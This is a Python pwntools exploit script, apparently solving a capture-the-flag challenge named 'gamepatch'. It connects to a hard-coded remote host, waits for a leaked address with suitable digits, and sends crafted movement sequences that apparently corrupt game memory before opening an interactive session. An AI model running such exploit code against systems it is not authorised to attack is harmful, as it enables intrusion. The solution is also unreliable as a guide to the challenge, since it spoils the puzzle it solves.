from pwn import *
from collections import Counter
from time import sleep

def spawn_process():
    # return process("./gamepatch")
    return remote("184.72.87.9", 8011)

while True:
    with spawn_process() as p:
        p.recvuntil(b"0 x ")
        addr = p.recvuntil(b"   ").strip().decode().replace(" ", "")
        counts = Counter(addr)
        if counts["6"] >= 2 and counts["c"] >= 1 and counts["8"] >= 1:
            p.sendline(b"ddddddssssssssssssddwawwaaawwwwddddddddddddddddsssdsssssssssssssssddwwwwwwwwwwwwwwwwwwdddddsssssssssassssssssssaaaaaaaaaaaaaaaaassdddwsdwsdwsdwsdwsdwsdwsdwsdwsdwsdwsddwaaaaaaaaasaaaaaaaawsaawsawawwdddssasdddddddddsdwaaaaassawddddwddddddddddwwwaaaaaaaaaaaasddwd")
            six = addr.index("6")
            six2 = addr.index("6", six + 1)
            c = addr.index("c")
            eight = addr.index("8")
            def pusher(i, j):
                pl = ""
                pl += "d" * i
                pl += "ssds"
                pl += "a" * (i - j + 2)
                pl += "saw"
                pl += "d" * (i - j + 2)
                pl += "www"
                pl += "a" * i
                return pl
            tot = pusher(six, 0) + pusher(six2, 1) + pusher(c, 4) + pusher(eight, 5)
            tot += "d" * 12
            while "ad" in tot:
                tot = tot.replace("ad", "")
            tot += "dssdsawasddsaaaaaaaaaaaaaaaaaaaasaawwssdwwdsdw"
            p.sendline(tot.encode())
            p.clean(timeout=0.2)
            p.interactive()
            break
